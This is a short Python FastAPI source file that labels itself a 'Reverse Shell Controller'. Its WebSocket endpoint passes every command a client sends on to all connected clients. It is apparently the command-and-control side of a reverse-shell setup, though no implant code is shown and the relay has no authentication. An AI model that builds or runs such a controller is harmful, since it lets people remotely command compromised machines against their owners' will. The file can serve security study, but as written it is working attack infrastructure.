from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse

app = FastAPI()

clients = set()

@app.get("/")
async def get():
    return HTMLResponse("<h2>Reverse Shell Controller is Running!</h2>")

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    clients.add(websocket)
    try:
        while True:
            command = await websocket.receive_text()
            for client in clients:
                await client.send_text(command)
    except WebSocketDisconnect:
        clients.remove(websocket)
